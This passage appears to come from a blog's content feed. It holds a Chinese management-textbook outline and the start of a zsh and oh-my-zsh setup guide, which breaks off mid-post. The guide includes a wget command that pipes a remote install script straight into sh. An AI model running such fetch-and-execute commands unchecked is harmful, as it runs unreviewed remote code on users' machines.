<li>组织变革的过程与程序<ul>
<li>组织变革的过程<ul>
<li>解冻阶段</li>
<li>变革阶段</li>
<li>再冻结阶段</li>
</ul>
</li>
<li>组织变革的程序<ul>
<li>诊断组织现状，发现变革征兆</li>
<li>分析变革因素，制定改革方案</li>
<li>选择正确方案，实施变革计划</li>
<li>评价变革效果，及时进行反馈</li>
</ul>
</li>
</ul>
</li>
<li>组织变革的阻力及其管理<ul>
<li>组织变革的阻力<ul>
<li>个人阻力<ul>
<li>利益上的影响</li>
<li>心理上的影响</li>
</ul>
</li>
<li>团体阻力<ul>
<li>组织结构变动的影响</li>
<li>人际关系调整的影响</li>
</ul>
</li>
</ul>
</li>
<li>消除组织变革阻力的管理对策<ul>
<li>客观分析变革的推力和阻力的强弱</li>
<li>创新组织文化</li>
<li>创新策略方法和手段</li>
</ul>
</li>
</ul>
</li>
<li>组织变革中的压力及其管理<ul>
<li>压力的定义</li>
<li>压力的起因及其特征<ul>
<li>组织因素</li>
<li>个人因素</li>
<li>压力的特征<ul>
<li>生理上的反应</li>
<li>心理上的反应</li>
<li>行为上的反应</li>
</ul>
</li>
</ul>
</li>
<li>压力的释解</li>
</ul>
</li>
<li>组织冲突及其管理<ul>
<li>组织冲突的影响<ul>
<li>竞争胜利对组织的影响有以下几方面。<ul>
<li>组织内部更加团结，成员对团体更加忠诚，这有利千加强和保持团体的凝聚力</li>
<li>组织内部气氛更为轻松，紧张的情绪有所消除，同时也容易失去继续奋斗的意志，容易滋生骄傲和得意忘形的情绪</li>
<li>强化了组织内部的协作，组织更为关心成员的心理需求，但对于完成工作及任务的关心则有减少的趋势</li>
<li>组织成员容易感到满足和舒畅，认为竞争胜利证实了自己的长处和对方的弱点，因此，反而不愿对其自身的不足重作估计和弥补，也不想重新反思团体是否还需要根据环境的变化作进一步的改善。</li>
</ul>
</li>
<li>竞争失败对组织的影响有以下几方面<ul>
<li>如果胜败的界限不是很分明，则团体会以种种借口和理由来掩饰自己的失败，团体之间也容易产生偏见，每个团体总是只看到对方的弱处，而忽视对方的长处</li>
<li>当团体发现失败是无可置疑的事实时，依据团体的基本状况，如成员平时的团结程度、失败的程度、对挫折的忍受程度等，可分为两种情况：一种情况是团体内部可能发生混乱与斗争，攻击现象频频发生，团体最终趋于解散；另一种情况是全体成员可能会知耻而奋起，通过努力探寻失败的原因，大胆改进，勤奋工作，以求走出失败的困境</li>
<li>竞争失败后的团体往往不太关心成员的心理需求，而只集中精力于自己的本职工作，组织中的组织性和纪律性明显增强，组织有集权化的倾向。</li>
<li>成员以往的自信心会受到极大的打击，过去的固执和偏见经过失败体验之后不得不重新进行检讨和反思，实际上，这正给了组织一个检讨、改革的机会。</li>
</ul>
</li>
</ul>
</li>
<li>组织冲突的类型<ul>
<li>正式组织与非正式组织之间的冲突</li>
<li>直线与参谋之间的冲突</li>
<li>委员会成员之间的冲突</li>
</ul>
</li>
<li>组织冲突的避免</li>
</ul>
</li>
</ul>
</li>
<li>组织文化及其发展<ul>
<li>组织文化的概念及其特征<ul>
<li>组织文化的基本概念</li>
<li>组织文化的主要特征<ul>
<li>超个体的独特性</li>
<li>相对稳定性</li>
<li>融合继承性</li>
<li>发展性</li>
</ul>
</li>
</ul>
</li>
<li>组织文化的结构与内容<ul>
<li>组织文化的结构<ul>
<li>潜层次的精神层</li>
<li>表层的制度系统</li>
<li>显现层的组织文化载体</li>
</ul>
</li>
<li>组织文化的内容<ul>
<li>组织的价值观</li>
<li>组织精神</li>
<li>伦理规范</li>
</ul>
</li>
</ul>
</li>
<li>组织文化的功能与塑造<ul>
<li>组织文化的功能<ul>
<li>整合功能</li>
<li>适应功能</li>
<li>导向功能</li>
<li>发展功能</li>
<li>持续功能</li>
</ul>
</li>
<li>组织文化的形成<ul>
<li>管理者的倡导</li>
<li>组织成员的接受：“社会化”与“预社会化”</li>
</ul>
</li>
<li>组织文化的塑造途径<ul>
<li>确立正确的组织价值观<ul>
<li>组织价值标准要正确、明晰、科学，具有鲜明特点。</li>
<li>组织价值观和组织文化要体现组织的宗旨、经营战略和发展方向。</li>
<li>要切实调查本组织员工的认可程度和接纳程度，使之与本组织员工的基本素质相和谐，过高或过低的标准都很难奏效</li>
<li>选择组织价值观要发挥员工的创造精神，认真听取员工的各种意见，并经过自上而下和自下而上的多次反复，审慎地筛选出既符合本组织特点又反映员工心态的组织价值观和组织文化模式。</li>
</ul>
</li>
<li>强化员工的认同感<ul>
<li>利用一切宣传媒体，宣传组织文化的内容和精要，以创造浓厚的环境氛围。</li>
<li>培养和树立典型</li>
<li>加强相关培训教育</li>
</ul>
</li>
<li>提炼定格<ul>
<li>精心分析</li>
<li>全面归纳</li>
<li>精炼定格</li>
</ul>
</li>
<li>巩固落实</li>
<li>在发展中不断丰富和完善</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="综合案例-2"><a href="#综合案例-2" class="headerlink" title="综合案例"></a>综合案例</h3><ul>
<li>万维公司的组织结构变革</li>
<li>广东北电——人性化管理</li>
</ul>
<h2 id="第四篇、领导"><a href="#第四篇、领导" class="headerlink" title="第四篇、领导"></a>第四篇、领导</h2><h3 id="十一、领导概论"><a href="#十一、领导概论" class="headerlink" title="十一、领导概论"></a>十一、领导概论</h3><ul>
<li>领导的内涵<ul>
<li>领导和管理  <img src = "2018_10_31_43.bmp"></li>
<li>领导的作用<ul>
<li>指挥作用</li>
<li>协调作用</li>
<li>激励作用</li>
</ul>
</li>
<li>领导权力的来源<ul>
<li>法定性权力</li>
<li>奖赏性权力</li>
<li>惩罚性权力</li>
<li>感召性权力</li>
<li>专长性权力</li>
</ul>
</li>
</ul>
</li>
<li>领导风格类型<ul>
<li>按权力运用方式划分<ul>
<li>集权式领导者</li>
<li>民主式领导者</li>
</ul>
</li>
<li>按创新方式划分<ul>
<li>魅力型领导者</li>
<li>变革型领导者</li>
</ul>
</li>
<li>按思维方式划分<ul>
<li>事务型领导者</li>
<li>战略型领导者</li>
</ul>
</li>
</ul>
</li>
<li>领导理论<ul>
<li>领导特性论<ul>
<li>努力进取，渴望成功</li>
<li>强烈的权力欲望</li>
<li>正直诚信，言行一致</li>
<li>充满自信</li>
<li>追求知识和信息</li>
</ul>
</li>
<li>领导行为论<ul>
<li>密歇根大学的研究<ul>
<li>一是工作（生产）导向型的领导行为</li>
<li>二是员工导向型领导行为</li>
</ul>
</li>
<li>俄亥俄州立大学的研究</li>
<li>管理方格论</li>
</ul>
</li>
<li>领导情景论<ul>
<li>菲德勒权变理论  <img src = "2018_10_31_40.bmp">
  <img src = "2018_10_31_41.bmp"></li>
<li>路径一目标理论</li>
<li>领导生命周期理论<ul>
<li>指导型(telling) 领导（高任务—低关系），领导者定义角色，告诉下属应该做什么、怎样做以及在何时何地做</li>
<li>推销型(selling ) 领导（高任务一高关系），领导者同时提供指导行为与支持行为</li>
<li>参与型(participating) 领导（低任务一高关系），领导者与下属共同决策，领导者的主要角色是提供便利条件和沟通。</li>
<li>授权型(delegating ) 领导（低任务一低关系），领导者提供较少的指导或支持  <img src = "2018_10_31_42.bmp"></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="十二、激励"><a href="#十二、激励" class="headerlink" title="十二、激励"></a>十二、激励</h3><ul>
<li>激励原理<ul>
<li>激励的概念与对象<ul>
<li>激励的概念</li>
<li>激励的对象</li>
</ul>
</li>
<li>激励与行为<ul>
<li>激励力＝效价x 期望值</li>
</ul>
</li>
<li>激励产生的内因与外因</li>
<li>需要的管理学意义</li>
</ul>
</li>
<li>激励的需要理论<ul>
<li>需要层次论<ul>
<li>生理的需要</li>
<li>安全的需要</li>
<li>社交的需要</li>
<li>尊重的需要</li>
<li>自我实现的需要</li>
</ul>
</li>
<li>双因素理论  <img src = "2018_10_31_44.bmp"></li>
<li>成就需要论<ul>
<li>成就的需要</li>
<li>依附的需要</li>
<li>权力的需要</li>
</ul>
</li>
<li>X 理论和Y 理论<ul>
<li>X 理论<ul>
<li>员工天性好逸恶劳，只要可能，就会躲避工作；</li>
<li>以自我为中心，漠视组织要求；</li>
<li>员工只要有可能就会逃避责任，安于现状，缺乏创造性；</li>
<li>不喜欢工作，需要对他们采取强制措施或惩罚办法，迫使他们实现组织目标</li>
</ul>
</li>
<li>y 理论<ul>
<li>员工并非好逸恶劳，而是自觉勤奋，喜欢工作；</li>
<li>员工有很强的自我控制能力，在工作中执行完成任务的承诺；</li>
<li>一般而言，每个人不仅能够承担责任，而且还主动寻求承担责任；</li>
<li>绝大多数人都具备做出正确决策的能力。</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>激励的过程理论<ul>
<li>公平理论<ul>
<li>横向比较</li>
<li>纵向比较</li>
</ul>
</li>
<li>期望理论</li>
<li>激励的强化理论<ul>
<li>正强化</li>
<li>负强化</li>
</ul>
</li>
</ul>
</li>
<li>激励实务<ul>
<li>薪酬管理<ul>
<li>绩效工资</li>
<li>分红</li>
<li>总奖金</li>
<li>知识工资</li>
</ul>
</li>
<li>员工持股计划</li>
<li>灵活的工作日程</li>
<li>目标管理</li>
</ul>
</li>
</ul>
<h3 id="十三、沟通"><a href="#十三、沟通" class="headerlink" title="十三、沟通"></a>十三、沟通</h3><ul>
<li>沟通的原理<ul>
<li>沟通及其作用<ul>
<li>通过沟通向交往对象提供行为建议；</li>
<li>通过沟通以积极或消极的方式激励或约束他人行为；</li>
<li>通过沟通向上司、下属或合作单位提供与决策制定或执行有关的各种信息</li>
<li>通过沟通获得与组织的活动相关的各种信息。</li>
</ul>
</li>
<li>沟通的过程  <img src = "2018_10_31_45.bmp">
  * 发送者需要向接受者传送信息或者需要接受者提供信息
  * 发送者将这些信息译成接受者能够理解的一系列符号
  * 将上述符号传递给接受者
  * 接受者接受这些符号
  * 接受者将这些符号译为具有特定含义的信息
  * 接受者理解信息的内容
  * 发送者通过反馈来了解他想传递的信息是否被对方准确无误地接受</li>
<li>沟通的类别  <img src = "2018_10_31_46.bmp">
  <img src = "2018_10_31_47.bmp"></li>
</ul>
</li>
<li>组织沟通<ul>
<li>个体间沟通</li>
<li>团队沟通</li>
<li>组织间沟通</li>
</ul>
</li>
<li>沟通管理<ul>
<li>有效沟通的障碍<ul>
<li>个人因素<ul>
<li>有选择地接受，</li>
<li>沟通技巧的差异。</li>
</ul>
</li>
<li>人际因素</li>
<li>结构因素</li>
<li>技术因素</li>
</ul>
</li>
<li>有效沟通的实现<ul>
<li>明了沟通的重要性，正确对待沟通</li>
<li>培养“听”的艺术  <img src = "2018_10_31_48.bmp"></li>
<li>创造一个相互信任，有利于沟通的小环境</li>
<li>缩短信息传递链，拓宽沟通渠道，保证信息的畅通无阻和完整性</li>
<li>建立特别委员会，定期加强上下级的沟通</li>
<li>组成非管理工作组</li>
<li>加强平行沟通，促进横向交流</li>
</ul>
</li>
</ul>
</li>
<li>组织冲突与谈判<ul>
<li>组织内冲突的原因<ul>
<li>沟通差异</li>
<li>结构差异</li>
<li>个体差异</li>
</ul>
</li>
<li>冲突的管理<ul>
<li>谨慎地选择想处理的冲突</li>
<li>仔细研究冲突双方的代表人物</li>
<li>深入了解冲突的根源</li>
<li>妥善的选择处理办法  <img src = "2018_10_31_49.bmp"></li>
</ul>
</li>
<li>有效谈判的实现<ul>
<li>谈判有两种基本方法<ul>
<li>笭和谈判就是有输有赢的谈判，一方所得就是另一方所失</li>
<li>双赢谈判就是谈判要找到一种双方都赢的方案</li>
</ul>
</li>
<li>优秀的管理者实现有效的谈判，一般要遵循如下的原则。<ul>
<li>理性分析谈判的事件</li>
<li>理解你的谈判对手</li>
<li>抱着诚意开始谈判</li>
<li>坚定与灵活相结合</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="综合案例-3"><a href="#综合案例-3" class="headerlink" title="综合案例"></a>综合案例</h3><ul>
<li>“闲可钓鱼”与“无暇吃鱼”</li>
<li>晋升停滞的骨干员工，留得住吗？</li>
</ul>
<h2 id="第五篇、控制"><a href="#第五篇、控制" class="headerlink" title="第五篇、控制"></a>第五篇、控制</h2><h3 id="十四、控制与控制过程"><a href="#十四、控制与控制过程" class="headerlink" title="十四、控制与控制过程."></a>十四、控制与控制过程.</h3><ul>
<li>控制活动<ul>
<li>控制的必要性<ul>
<li>环境的变化</li>
<li>管理权力的分散</li>
<li>工作能力的差异</li>
</ul>
</li>
<li>控制的基本原理</li>
<li>控制类型<ul>
<li>根据确定控制标准Z 值的方法分类<ul>
<li>程序控制</li>
<li>跟踪控制</li>
<li>自适应控制</li>
<li>最佳控制</li>
</ul>
</li>
<li>根据时机、对象和目的分类<ul>
<li>前馈控制</li>
<li>同期控制</li>
<li>反馈控制</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>控制过程<ul>
<li>确立标准<ul>
<li>确定控制对象<ul>
<li>关于环境特点及其发展趋势的假设</li>
<li>资源投入</li>
<li>组织的活动</li>
</ul>
</li>
<li>选择控制的重点<ul>
<li>获利能力</li>
<li>市场地位</li>
<li>生产率</li>
<li>产品领导地位</li>
<li>人员发展</li>
<li>员工态度</li>
<li>公共责任</li>
<li>短期目标与长期目标的平衡</li>
</ul>
</li>
<li>制定标准的方法<ul>
<li>统计性标准</li>
<li>根据评估建立标准</li>
<li>工程标准</li>
</ul>
</li>
</ul>
</li>
<li>衡量绩效<ul>
<li>通过衡量成绩，检验标准的客观性和有效性</li>
<li>确定适宜的衡量频度</li>
<li>建立信息反馈系统</li>
</ul>
</li>
<li>纠正偏差<ul>
<li>找出偏差产生的主要原因</li>
<li>确定纠偏措施的实施对象</li>
<li>选择恰当的纠偏措施<ul>
<li>使纠偏方案双重优化</li>
<li>充分考虑原先计划实施的影响</li>
<li>注意消除人们对纠偏措施的疑虑</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>有效控制<ul>
<li>适时控制</li>
<li>适度控制<ul>
<li>防止控制过多或控制不足</li>
<li>处理好全面控制与重点控制的关系</li>
<li>使花费一定费用的控制得到足够的控制收益  <img src = "2018_10_31_50.bmp"></li>
</ul>
</li>
<li>客观控制</li>
<li>弹性控制</li>
</ul>
</li>
</ul>
<h3 id="十五、控制方法"><a href="#十五、控制方法" class="headerlink" title="十五、控制方法"></a>十五、控制方法</h3><ul>
<li>预算控制<ul>
<li>预算的编制</li>
<li>预算的种类<ul>
<li>收入预算</li>
<li>支出预算<ul>
<li>直接材料预算</li>
<li>直接人工预算</li>
<li>附加费用预算</li>
</ul>
</li>
<li>现金预算</li>
<li>资金支出预算</li>
<li>资产负债预算</li>
</ul>
</li>
<li>预算的作用及缺点</li>
</ul>
</li>
<li>生产控制<ul>
<li>对供应商的控制</li>
<li>库存控制</li>
<li>质量控制</li>
</ul>
</li>
<li>财务控制方法<ul>
<li>比率分析<ul>
<li>财务比率<ul>
<li>流动比率</li>
<li>速动比率</li>
<li>负债比率</li>
<li>盈利比率</li>
</ul>
</li>
<li>经营比率<ul>
<li>库存周转率</li>
<li>固定资产周转率</li>
<li>销售收人与销售费用的比率</li>
</ul>
</li>
</ul>
</li>
<li>经营审计<ul>
<li>外部审计</li>
<li>内部审计</li>
<li>管理审计<ul>
<li>反映企业管理绩效及其影响因素主要有：<ul>
<li>经济功能</li>
<li>企业组织结构</li>
<li>收入合理性</li>
<li>研究与开发</li>
<li>财务政策</li>
<li>生产效率</li>
<li>销售能力</li>
<li>对管理当局的评估</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>其他方法</li>
</ul>
</li>
<li>综合控制方法<ul>
<li>标杆控制<ul>
<li>标杆控制的内涵</li>
<li>标杆控制的步骤<ul>
<li>确定标杆控制的项目</li>
<li>确定标杆控制的对象和对比点</li>
<li>组成工作小组，确定工作计划</li>
<li>资料收集和调查</li>
<li>分析比较，找出差距，确定最佳纠偏做法</li>
<li>明确改进方向，制定实施方案</li>
<li>沟通与修正方案</li>
<li>实施与监督</li>
<li>总结经验</li>
<li>进行再标杆循环</li>
</ul>
</li>
<li>标杆控制的作用和缺陷</li>
</ul>
</li>
<li>平衡积分卡控制<ul>
<li>平衡积分卡控制的内涵<ul>
<li>平衡积分卡将企业的战略置千核心地位</li>
<li>平衡积分卡使战略在企业上下进行交流和学习，并与各部门和个人的目标联系起来</li>
<li>平衡积分卡使战略目标在各个经营层面达成一致</li>
<li>平衡积分卡有助于短期成果和长远发展的协同和统一</li>
</ul>
</li>
<li>平衡积分卡的控制指标<ul>
<li>财务方面</li>
<li>客户方面</li>
<li>内部经营过程</li>
<li>学习和成长  <img src = "2018_10_31_51.bmp"></li>
</ul>
</li>
<li>平衡积分卡的控制作用</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="综合案例-4"><a href="#综合案例-4" class="headerlink" title="综合案例"></a>综合案例</h3><ul>
<li>“模拟市场核算，实行成本否决”的邯钢模式</li>
</ul>
<h2 id="第六篇、创新"><a href="#第六篇、创新" class="headerlink" title="第六篇、创新"></a>第六篇、创新</h2><h3 id="十六、管理的创新职能"><a href="#十六、管理的创新职能" class="headerlink" title="十六、管理的创新职能"></a>十六、管理的创新职能</h3><ul>
<li>创新及其作用<ul>
<li>作为管理基本职能的创新<ul>
<li>创新工作是管理过程的重要一环<ul>
<li>确立系统的目标，即人们从事某项活动希望达到的状况和水平；</li>
<li>制定并选择可实现目标的行动方案；</li>
<li>分解目标活动，据此设计系统所需要的职务、岗位，并加以组合，规定它们之间相互关系，形成一定的系统结构；</li>
<li>根据各岗位的工作要求，招聘和调配工作人员；</li>
<li>发布工作指令，组织供应各环节活动所需的物质和信息条件，使系统运行起来；</li>
<li>在系统运转过程中，协调各部分的关系，使他们的工作相互衔接、平衡地进行；</li>
<li>检查和控制各部门的工作，纠正实际工作中的失误和偏差，使之符合预定的要求；</li>
<li>注视内外条件的变化，寻找并利用变革的机会，计划并组织实施系统的变化和发展</li>
</ul>
</li>
<li>创新工作是重要管理活动</li>
<li>创新工作具有逻辑的结构</li>
</ul>
</li>
<li>创新与维持的关系及其作用</li>
<li>创新的类别与特征<ul>
<li>系统内部的创新可以从不同的角度去考察。<ul>
<li>从创新的规模以及创新对系统的影响程度考察，可将其分为局部创新和整体创新。</li>
<li>从创新与环境的关系来分析，可将其分为消极防御型创新与积极攻击型创新。</li>
<li>从创新发生的时期来看，可将其分为系统初建期的创新和运行中的创新。</li>
<li>从创新的组织程度上看，可分为自发创新与有组织的创新。</li>
</ul>
</li>
<li>有组织的创新包含飞列两层意思。<ul>
<li>系统的管理人员根据创新的客观要求和创新活动本身的客观规律一，制度化地研究外部环境状况和内部工作，寻求和利用创新机会，计划和组织创新活动。</li>
<li>在这同时，系统的管理人员要积极地引导和利用各要素的自发创新，使之相互协调并与系统有计划的创新活动相配合，使整个系统内的创新活动有计划有组织地展开。只有有组织的创新，才能给系统带来预期的、积极的、比较确定的结果。</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>创新职能的基本内容<ul>
<li>目标创新</li>
<li>技术创新<ul>
<li>要素创新<ul>
<li>材料创新</li>
<li>设备创新</li>
</ul>
</li>
<li>要素组合方法创新</li>
<li>要素组合结果创新</li>
</ul>
</li>
<li>制度创新<ul>
<li>产权制度</li>
<li>经营制度</li>
<li>管理制度</li>
</ul>
</li>
<li>组织机构和结构的创新</li>
<li>环境创新</li>
</ul>
</li>
<li>创新过程及其管理<ul>
<li>创新的过程<ul>
<li>抵制创新的原因<ul>
<li>个人利益</li>
<li>缺乏了解</li>
<li>评价差异</li>
<li>惰性</li>
<li>团体心理压力</li>
</ul>
</li>
<li>创新活动的过程<ul>
<li>寻找机会</li>
<li>提出构想</li>
<li>迅速行动</li>
<li>坚持不懈</li>
</ul>
</li>
</ul>
</li>
<li>领导创新</li>
<li>创新管理的技能<ul>
<li>正确理解和扮演“管理者”的角色</li>
<li>创造促进创新的组织氛围</li>
<li>制定有弹性的计划</li>
<li>正确地对待失败</li>
<li>建立合理的奖酬制度<ul>
<li>注意物质奖励与精神奖励的结合</li>
<li>奖励不能视作“不犯错误的报酬”‘而应是对特殊贡献、甚至是对希望做出特殊贡献的努力的报酬；奖励的对象不仅包括成功以后的创新者，而且应当包括那些成功以前、甚至是没有获得成功的努力者</li>
<li>奖励制度要既能促进内部之竞争，又能保证成员间的合作</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>工作流程的再造<ul>
<li>工作流程特性和功能<ul>
<li>组织基本流程的类型</li>
<li>组织工作流程构成的影响因素<ul>
<li>工作流程的构成<ul>
<li>工作</li>
<li>逻辑关系</li>
<li>转换关系</li>
</ul>
</li>
<li>影响工作流程构成的因素<ul>
<li>组织的文化</li>
<li>工艺技术特征</li>
<li>管理风格</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>流程再造的基本观念<ul>
<li>组织企业实施业务流程再造是企业长期可持续发展的战略需要</li>
<li>组织工作流程再造的根本目标是建立顾客满意的工作流程</li>
<li>组织工作流程再造追求实现目标、技术和人的动态平衡</li>
</ul>
</li>
<li>流程再造的基本途径  <img src = "2018_10_31_52.bmp">
  * BPR 运作程序大致划分为四大类：
      * 描述项目（ 确定项目边界）；设立远景，价值观和目标；再设计业务流程和相关工具、模型评估概念；制定实施方案；实施再设计；通过绩效衡量来实现持续性的流程改进。
      * 项目界定；建立AS一1S 流程模型．即对现有流程进行诊断；再设计业务流程； 进行成本—收益分析：计划并实施新的流程体系； 评估流程绩效。
      * 项目界定，确定项目理想目标；向业务相关人员（顾客、合作者、业内标杆技术领先者）学习；建立远景，并设计新的业务流程模型； 开发相配套的技术支持系统和组织结构；实施改进分析，并准备跟踪业务的成本收益变化；定义流程系统，开展必要的培训，并实施计划；开发解决方案；实施解决方案并衡量绩效改进效果。
      * 项目界定并组建项目团队；运用头脑风暴法来发掘新的流程和技术；分析并优化改进的可能性（收益分析）；机会择优，并设计解决方案；开发新的业务流程、信息系统和可用工具；制定实施计划并执行解决方案；绩效衡量。</li>
</ul>
</li>
</ul>
<h3 id="十七、企业技术创新"><a href="#十七、企业技术创新" class="headerlink" title="十七、企业技术创新"></a>十七、企业技术创新</h3><ul>
<li>技术创新及其贡献<ul>
<li>创新与技术创新</li>
<li>技术创新的贡献</li>
</ul>
</li>
<li>技术创新的源泉<ul>
<li>意外的成功或失败</li>
<li>企业内外的不协调</li>
<li>过程改进的需要</li>
<li>行业和市场结构的变化</li>
<li>人口结构的变化</li>
<li>观念的改变</li>
<li>新知识的产生</li>
</ul>
</li>
<li>技术创新的战略及其选择<ul>
<li>创新基础的选择</li>
<li>创新对象的选择</li>
<li>创新水平的选择<ul>
<li>先发制人可给企业带来下述贡献。<ul>
<li>可给企业带来良好的声誉</li>
<li>可使企业占据有利的市场地位</li>
<li>可使企业进入最有利的销售渠道</li>
<li>可使企业获得有利的要素来源</li>
<li>可使企业获取高额的垄断利润</li>
</ul>
</li>
<li>率先开发某种技术或产品可能给企业带来以下几个方面的烦恼<ul>
<li>要求企业付出高额的市场开发费用</li>
<li>需求的不确定性</li>
<li>技术的不确定性</li>
</ul>
</li>
</ul>
</li>
<li>创新方式的选择</li>
</ul>
</li>
<li>技术创新与产品开发<ul>
<li>产品开发的任务<ul>
<li>产品性质的确定</li>
<li>产品质量的确定<ul>
<li>消费者希望得到哪些功能？除基本功能外，还要求得到何种辅助功能？</li>
<li>消费者对产品功能差异的辨识能力如何？如果消费者在使用过程中不能感受到不同产品的功能差异，那么就可能不愿为功能更完善的产品支付更高的价格。</li>
<li>进一步完善产品功能的成本是多少？是否与消费者愿意支付的费用大致相同？换句话说，产品质量完善的经济效益如何？</li>
</ul>
</li>
<li>新产品开发</li>
</ul>
</li>
<li>产品竞争战略<ul>
<li>领先战略</li>
<li>追随战略</li>
<li>模仿战略</li>
</ul>
</li>
<li>产品开发的分析方法<ul>
<li>投入期</li>
<li>成长期</li>
<li>成熟期</li>
<li>衰退期</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="十八、企业组织创新"><a href="#十八、企业组织创新" class="headerlink" title="十八、企业组织创新"></a>十八、企业组织创新</h3><ul>
<li>企业制度创新<ul>
<li>企业制度及其分类<ul>
<li>企业制度及其功能</li>
<li>企业制度分类的线索<ul>
<li>企业制度分类的参与者因子<ul>
<li>劳动与劳动者</li>
<li>资本与资本供应者</li>
<li>知识与经营者</li>
</ul>
</li>
<li>企业制度分类的关系因子<ul>
<li>权力关系</li>
<li>利益关系</li>
<li>权力关系与利益关系的“逻辑“一致性</li>
</ul>
</li>
<li>企业制度的不同类型<ul>
<li>资本逻辑的企业制度</li>
<li>劳动逻辑的企业制度</li>
<li>知识逻辑的企业制度</li>
<li>综合逻辑的企业制度</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>工业社会的企业制度结构选择及其特征</li>
<li>知识经济条件下的企业制度创新</li>
</ul>
</li>
<li>企业层次结构创新<ul>
<li>层级结构及其基本类型<ul>
<li>相对比较集权的锥型形态</li>
<li>相对比较分权的扁平形态</li>
</ul>
</li>
<li>工业社会的企业层级结构及其特征<ul>
<li>直线指挥，分层授权</li>
<li>分工细致，权责明确</li>
<li>标准统一，关系正式</li>
</ul>
</li>
<li>知识经济与企业层级结构的改造<ul>
<li>集权和分权的统一</li>
<li>稳定与变化的统一</li>
<li>一元性与多元性的统一</li>
</ul>
</li>
</ul>
</li>
<li>企业文化创新<ul>
<li>企业文化的功能与反功能<ul>
<li>行为导向功能</li>
<li>行为激励功能</li>
<li>行为协调功能</li>
</ul>
</li>
<li>工业社会中企业文化的特点<ul>
<li>企业文化是作为企业经营的一种副产品而出现的</li>
<li>企业文化基本上反映了企业组织的记忆</li>
<li>企业文化是作为一种辅助手段而发挥作用的</li>
<li>企业文化是一元的</li>
</ul>
</li>
<li>知识经济与企业文化创新<ul>
<li>第一，企业文化将成为知识经济条件下企业管理的重要的，甚至是主要的手段。</li>
<li>第二，企业文化将是人们自觉创造的结果，而不是企业生产经营中的一种副产品。</li>
<li>第三，作为人们自觉行为结果的企业文化不仅是记忆型的，而且是学习型的，或者更准确地说，主要不是记忆型的，而是学习型的</li>
<li>第四，企业文化将在强调主导价值观与行为准则的同时，允许异质价值观和行为准则的存在。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="综合案例-5"><a href="#综合案例-5" class="headerlink" title="综合案例"></a>综合案例</h3><ul>
<li>小天鹅的”末日管理”</li>
<li>矩阵管理——团的管理创新</li>
</ul>
]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Book</category>
      </categories>
  </entry>
  <entry>
    <title>zsh配置记录</title>
    <url>/blogs/2018-10-25-zshConfig/</url>
    <content><![CDATA[<h1 id="一、安装zsh"><a href="#一、安装zsh" class="headerlink" title="一、安装zsh"></a>一、安装zsh</h1><h2 id="1-apt包管理系列"><a href="#1-apt包管理系列" class="headerlink" title="1. apt包管理系列"></a>1. apt包管理系列</h2><p>直接执行命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install zsh</span><br></pre></td></tr></table></figure>

<h1 id="二、配置zsh"><a href="#二、配置zsh" class="headerlink" title="二、配置zsh"></a>二、配置zsh</h1><h2 id="1-默认使用zsh作为shell"><a href="#1-默认使用zsh作为shell" class="headerlink" title="1. 默认使用zsh作为shell"></a>1. 默认使用zsh作为shell</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chsh -s /bin/zsh</span><br></pre></td></tr></table></figure>

<p>重启终端即可</p>
<h2 id="2-使用oh-my-zsh美化zsh"><a href="#2-使用oh-my-zsh美化zsh" class="headerlink" title="2. 使用oh-my-zsh美化zsh"></a>2. 使用oh-my-zsh美化zsh</h2><h3 id="2-1-安装oh-my-zsh"><a href="#2-1-安装oh-my-zsh" class="headerlink" title="2.1. 安装oh-my-zsh"></a>2.1. 安装oh-my-zsh</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sh -c &quot;$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)&quot;</span><br></pre></td></tr></table></figure>

<p>自动安装，会直接使用默认主题<code>robbyrussell</code></p>
<h3 id="2-2-修改主题"><a href="#2-2-修改主题" class="headerlink" title="2.2. 修改主题"></a>2.2. 修改主题</h3><p>执行以下命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim ~/.zshrc</span><br></pre></td></tr></table></figure>

<p>找到</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ZSH_THEME=&quot;robbyrussell&quot;</span><br></pre></td></tr></table></figure>

<p>改为自己想要的主题即可，推荐一个主题<code>ys</code></p>
<h3 id="2-3-插件"><a href="#2-3-插件" class="headerlink" title="2.3. 插件"></a>2.3. 插件</h3><h4 id="1-代码高亮-zsh-syntax-highlighting"><a href="#1-代码高亮-zsh-syntax-highlighting" class="headerlink" title="(1) 代码高亮 zsh-syntax-highlighting"></a>(1) 代码高亮 <code>zsh-syntax-highlighting</code></h4><p>使用以下命令安装插件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/zsh-users/zsh-syntax-highlighting.git $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-syntax-highlighting</span><br></pre></td></tr></table></figure>

<p>在<code>.zshrc</code>下修改<code>plugins</code>添加插件即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">plugins=(</span><br><span class="line">    zsh-syntax-highlighting</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h4 id="2-上一次执行代码提示-zsh-autosuggestions"><a href="#2-上一次执行代码提示-zsh-autosuggestions" class="headerlink" title="(2) 上一次执行代码提示 zsh-autosuggestions"></a>(2) 上一次执行代码提示 <code>zsh-autosuggestions</code></h4><p>使用以下命令安装插件</p>
